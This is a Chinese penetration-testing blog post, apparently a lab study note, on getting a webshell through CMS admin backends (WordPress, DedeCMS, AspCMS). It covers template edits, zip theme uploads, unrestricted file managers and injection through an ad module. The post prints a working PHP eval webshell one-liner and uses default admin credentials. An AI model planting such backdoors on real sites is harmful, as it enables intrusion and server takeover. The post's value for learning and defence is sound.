@@ -1,0 +1,1781 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="网站后台getshell, 晓莎K&#39;s blog">
+    <meta name="description" content="网站后台getshell
+
+概述通过注入或者其他途径，获取网站管理员账号和密码后，找到后台登录地址，登录后，寻找后台漏洞上传网页后门，获取网站的webshell
+webshell的作用是方便攻击者，webshell是拥有fso权限，根据fs">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>网站后台getshell | 晓莎K&#39;s blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="晓莎K's blog" type="application/atom+xml">
+
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">晓莎K&#39;s blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">晓莎K&#39;s blog</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/0x00xiaoshaK" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/0x00xiaoshaK" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">网站后台getshell</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+        background-color: rgb(255, 255, 255,0.7);
+        border-radius: 10px;
+        box-shadow: 0 10px 35px 2px rgba(0, 0, 0, .15), 0 5px 15px rgba(0, 0, 0, .07), 0 2px 5px -5px rgba(0, 0, 0, .1) !important;
+    }
+
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+    height: calc(100vh - 250px);
+    overflow: scroll;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0getshell/">
+                                <span class="chip bg-color">网站后台getshell</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                渗透测试
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-12-04
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.3k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    12 分
+                </div>
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="网站后台getshell"><a href="#网站后台getshell" class="headerlink" title="网站后台getshell"></a>网站后台getshell</h1><span id="more"></span>
+
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>通过注入或者其他途径，获取网站管理员账号和密码后，找到后台登录地址，登录后，寻找后台漏洞上传网页后门，获取网站的webshell</p>
+<p>webshell的作用是方便攻击者，webshell是拥有fso权限，根据fso权限的不同，可以对网页进行编辑，删除，上传或者下载，查看文件。</p>
+<p>攻击者也可以通过这个webshell对服务器进行提权，提权成功后，会得到服务器管理权限。</p>
+<p>拿webshell也叫getshell。</p>
+<h2 id="途径"><a href="#途径" class="headerlink" title="途径"></a>途径</h2><p>网站后台的因为功模块较多，很多开发人员也不会对后台的业务输入，进行严格过滤，输入有危害的内容，与漏洞配合很容易拿到网站的webshell。</p>
+<p>可以通过文件上传漏洞、SQL注入漏洞、文件任意写入漏洞、文件远程下载漏洞，SQL语句执行漏洞、数据库备份漏洞，文件包含漏洞等漏洞获取网站的webshell。</p>
+<p>根据利用的漏洞类型分为：</p>
+<ul>
+<li><p>模板编辑拿webshell</p>
+<p>通过修改模块写入一句话，网站再调用模板的时，会自动加载这个模板，运行后门。</p>
+</li>
+<li><p>文件上传拿webshell</p>
+<p>通过后台的上传模块，上传网页后门，就可以拿到webshell</p>
+</li>
+<li><p>文件写入拿webshell</p>
+<p>通过可控参数将恶意代码写入文件里，即可获取webshell</p>
+</li>
+<li><p>zip自解压拿webshell</p>
+<p>上传zip文件，在其加入webshell文件，程序会自动解压，将后门解压到网站目录，可以获取webshell。</p>
+</li>
+<li><p>远程图片下载拿webshell</p>
+<p>有的网站后台会存在远程图片下载功能，但是没有对其后缀名进行限制，导致可以下去webshell文件。</p>
+</li>
+<li><p>编辑器漏洞拿webshell</p>
+<p>有的编辑器存在上传漏洞，通过编辑器漏洞可以获取网站的webshell。</p>
+</li>
+<li><p>备份拿webshell</p>
+<p>很多的asp网站 都存在备份功能，上传有恶意的图片，备份成脚本文件，即可获取webshell</p>
+</li>
+<li><p>SQL语句执行拿webshell</p>
+<p>有的网站存在sql执行命令，可以通过命令备份或导出一句话后门到指定网站目录，即可获取webshell</p>
+</li>
+<li><p>SQL注入写shell 拿webshell</p>
+<p>网站前台设置了防注入，但是后台一般都存在注入，如果权限有读写，使用命令进行读写文件，或者执行写入后门，即可获取webshell</p>
+</li>
+</ul>
+<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="word-press后台-getshell"><a href="#word-press后台-getshell" class="headerlink" title="word press后台 getshell"></a>word press后台 getshell</h3><p>我们先登陆后台</p>
+<p>后台路径</p>
+<pre class="line-numbers language-none"><code class="language-none">www.cbi1.com/wp-admin/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/04/day35/image-20211204104306909.png" alt="image-20211204104306909"></p>
+<p>admin 123456 登录进入后台管理</p>
+<h4 id="修改模板getshell"><a href="#修改模板getshell" class="headerlink" title="修改模板getshell"></a>修改模板getshell</h4><p>接下来我们进入 外观 主题 编辑 </p>
+<p><img src="/2021/12/04/day35/image-20211204104541910.png" alt="image-20211204104541910"></p>
+<p>我们通过写入php一句话方式getshell，看到404模板为php后缀文件，所以我们在此加入一句话会被解析执行。</p>
+<pre class="line-numbers language-none"><code class="language-none">一句话
+&lt;?php phpinfo();eval($_POST['123']);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/2021/12/04/day35/image-20211204105007809.png" alt="image-20211204105007809"></p>
+<p>在靶机上我们查看文件发现一句话确实被写入了</p>
+<p><img src="/2021/12/04/day35/image-20211204110538620.png" alt="image-20211204110538620"></p>
+<pre class="line-numbers language-none"><code class="language-none">路径
+www.cbi1.com\wp-content\themes\twentysixteen\404.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>看到phpinfo语句被执行</p>
+<p><img src="/2021/12/04/day35/image-20211204110603509.png" alt="image-20211204110603509"></p>
+<p>用蚁剑也能连接上</p>
+<p><img src="/2021/12/04/day35/image-20211204110806317.png" alt="image-20211204110806317"></p>
+<h4 id="zip自解压getshell"><a href="#zip自解压getshell" class="headerlink" title="zip自解压getshell"></a>zip自解压getshell</h4><p>进入后台管理后，在外观 主题 下发现可上传主题</p>
+<p><img src="/2021/12/04/day35/image-20211204110950993.png" alt="image-20211204110950993"></p>
+<p>在事先准备好的主题下写入一句话，然后压缩为zip格式上传即可</p>
+<p><img src="/2021/12/04/day35/image-20211204111258930.png" alt="image-20211204111258930"></p>
+<p>可看到上传上去了</p>
+<pre class="line-numbers language-none"><code class="language-none">路径
+http://www.cbi1.com/wp-content/themes/moon/1.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>可看到phpinfo信息</p>
+<p><img src="/2021/12/04/day35/image-20211204111555067.png" alt="image-20211204111555067"></p>
+<p>连接也可成功</p>
+<p><img src="/2021/12/04/day35/image-20211204111636883.png" alt="image-20211204111636883"></p>
+<h3 id="dedecms后台-getshell"><a href="#dedecms后台-getshell" class="headerlink" title="dedecms后台 getshell"></a>dedecms后台 getshell</h3><p>首先还是要进入后台</p>
+<pre class="line-numbers language-none"><code class="language-none">路径
+http://www.cbi2.com/dede/login.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/2021/12/04/day35/image-20211204114057624.png" alt="image-20211204114057624"></p>
+<p>admin 123456 进入后台管理</p>
+<h4 id="文件上传-getshell"><a href="#文件上传-getshell" class="headerlink" title="文件上传 getshell"></a>文件上传 getshell</h4><p>进入后台后发现附件管理里有个上传新文件，点击后发现限制了后缀</p>
+<p><img src="/2021/12/04/day35/image-20211204114255073.png" alt="image-20211204114255073"></p>
+<p>然而点击文件式管理器后，发现也可上传文件且没有限制</p>
+<p>我们准备好一句话上传上去</p>
+<p><img src="/2021/12/04/day35/image-20211204114521600.png" alt="image-20211204114521600"></p>
+<pre class="line-numbers language-none"><code class="language-none">路径
+http://www.cbi2.com/uploads/1.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/2021/12/04/day35/image-20211204114452199.png" alt="image-20211204114452199"></p>
+<p><img src="/2021/12/04/day35/image-20211204114653835.png" alt="image-20211204114653835"></p>
+<h4 id="修改模板getshell-1"><a href="#修改模板getshell-1" class="headerlink" title="修改模板getshell"></a>修改模板getshell</h4><p>我们在模板 默认模板管理里发现可以修改模板</p>
+<p><img src="/2021/12/04/day35/image-20211204114936335.png" alt="image-20211204114936335"></p>
+<p>但是里面的都是htm后缀，我们如果加入php一句话显然不会被作为php代码解析</p>
+<p>接着我们在生成里发现了更新主页htm，我们可以把主页htm后缀改为php后缀，即可解决一句话不解析的问题</p>
+<p>在index.htm模板里加入一句话</p>
+<p><img src="/2021/12/04/day35/image-20211204120913107.png" alt="image-20211204120913107"></p>
+<p>在生成里更改主页的后缀</p>
+<p><img src="/2021/12/04/day35/image-20211204121003150.png" alt="image-20211204121003150"></p>
+<p>访问index.php，看到一句话被作为php解析了</p>
+<p><img src="/2021/12/04/day35/image-20211204121020685.png" alt="image-20211204121020685"></p>
+<h4 id="任意命令执行getshell"><a href="#任意命令执行getshell" class="headerlink" title="任意命令执行getshell"></a>任意命令执行getshell</h4><p>代码审计后发现此方法</p>
+<p>登录后台后，我们在模块里发现广告管理 增加广告中可以写入代码</p>
+<p>我们写入一句话</p>
+<p><img src="/2021/12/04/day35/image-20211204121556743.png" alt="image-20211204121556743"></p>
+<p>写入了</p>
+<p><img src="/2021/12/04/day35/image-20211204121714512.png" alt="image-20211204121714512"></p>
+<pre class="line-numbers language-none"><code class="language-none">路径
+http://www.cbi2.com/plus/ad_js.php?aid=5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>进行连接</p>
+<pre class="line-numbers language-none"><code class="language-none">这里写入的一句话内容
+&lt;?php phpinfo();eval($_POST['123']);?&gt;
+但是无法用蚁剑连接，把post里的引号去掉，发现可以连接了
+&lt;?php phpinfo();eval($_POST[123]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>这里的一句话是写入数据库，所以引号会报错</p>
+</blockquote>
+<p>可以看到拿到了webshell</p>
+<p><img src="/2021/12/04/day35/image-20211205131348554.png" alt="image-20211205131348554"></p>
+<p>分析源码 这是在网站里找到的广告调用</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">/**
+ *
+ * 广告JS调用方式
+ *
+ * @version        $Id: ad_js.php 1 20:30 2010年7月8日Z $
+ * @package        DedeCMS.Site
+ * @copyright      Copyright (c) 2007 - 2010, DesDev, Inc.
+ * @license        http://help.dedecms.com/usersguide/license.html
+ * @link           http://www.dedecms.com
+ */</span>
+<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"/../include/common.inc.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$arcID</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$aid</span> <span class="token operator">=</span> <span class="token variable">$arcID</span><span class="token punctuation">;</span>
+<span class="token variable">$arcID</span> <span class="token operator">=</span> <span class="token variable">$aid</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$aid</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$aid</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$aid</span> <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$aid</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">' Request Error! '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$cacheFile</span> <span class="token operator">=</span> <span class="token constant">DEDEDATA</span><span class="token operator">.</span><span class="token string single-quoted-string">'/cache/myad-'</span><span class="token operator">.</span><span class="token variable">$aid</span><span class="token operator">.</span><span class="token string single-quoted-string">'.htm'</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$nocache</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$cacheFile</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">filemtime</span><span class="token punctuation">(</span><span class="token variable">$cacheFile</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token variable">$cfg_puccache_time</span> <span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$dsql</span><span class="token operator">-&gt;</span><span class="token function">GetOne</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT * FROM `#@__myad` WHERE aid='<span class="token interpolation"><span class="token variable">$aid</span></span>' "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$adbody</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'timeset'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$adbody</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'normbody'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">else</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$ntime</span> <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ntime</span> <span class="token operator">&gt;</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'endtime'</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token variable">$ntime</span> <span class="token operator">&lt;</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'starttime'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token variable">$adbody</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'expbody'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token variable">$adbody</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'normbody'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token variable">$adbody</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\"'</span><span class="token punctuation">,</span><span class="token variable">$adbody</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$adbody</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\r"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\\r"</span><span class="token punctuation">,</span><span class="token variable">$adbody</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$adbody</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\\n"</span><span class="token punctuation">,</span><span class="token variable">$adbody</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$adbody</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;!--\r\ndocument.write(\"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$adbody</span><span class="token punctuation">}</span></span>\");\r\n--&gt;\r\n"</span><span class="token punctuation">;</span>
+    <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$cacheFile</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token variable">$adbody</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">include</span> <span class="token variable">$cacheFile</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>首先获取广告aid，若为0返回 request error；</p>
+<p>然后从数据中获取内容拿到catch file 文件里，然后包含进来，这会导致命令执行</p>
+<p>所以我们可以写入一句话getshell</p>
+<h3 id="aspcms后台-getshell"><a href="#aspcms后台-getshell" class="headerlink" title="aspcms后台 getshell"></a>aspcms后台 getshell</h3><p>我们首先进入后台，路径如下</p>
+<pre class="line-numbers language-none"><code class="language-none">www.cbi3.com/admin_aspcms<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>admin 123456进入后台</p>
+<p><img src="/2021/12/04/day35/image-20211205134706714.png" alt="image-20211205134706714"></p>
+<h4 id="修改配置文件getshell"><a href="#修改配置文件getshell" class="headerlink" title="修改配置文件getshell"></a>修改配置文件getshell</h4><p>在后台里，如果可以修改网站配置文件，且没有做过滤，则我们可以写入准备好的语句getshell。</p>
+<p>这里需要注意闭合的问题，因为配置文件在网站中是全局调用，出错的话网站无法访问。</p>
